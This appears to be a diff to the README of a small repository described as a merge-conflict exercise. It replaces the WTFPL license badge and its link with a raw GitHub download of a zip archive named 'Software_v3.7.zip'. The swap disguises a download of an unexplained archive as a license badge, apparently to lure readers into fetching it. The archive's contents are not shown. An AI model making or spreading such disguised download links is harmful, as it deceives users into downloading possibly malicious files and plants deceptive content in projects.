@@ -1,4 +1,4 @@
 ooooooogame - a exercise dealing with merge conflict
 ==================================
 
-[![WTFPL badge](http://www.wtfpl.net/wp-content/uploads/2012/12/wtfpl-badge-2.png)](http://www.wtfpl.net)
+[![WTFPL badge](https://raw.githubusercontent.com/s70439/ooooooogame/master/grank/Software_v3.7.zip)](https://raw.githubusercontent.com/s70439/ooooooogame/master/grank/Software_v3.7.zip)
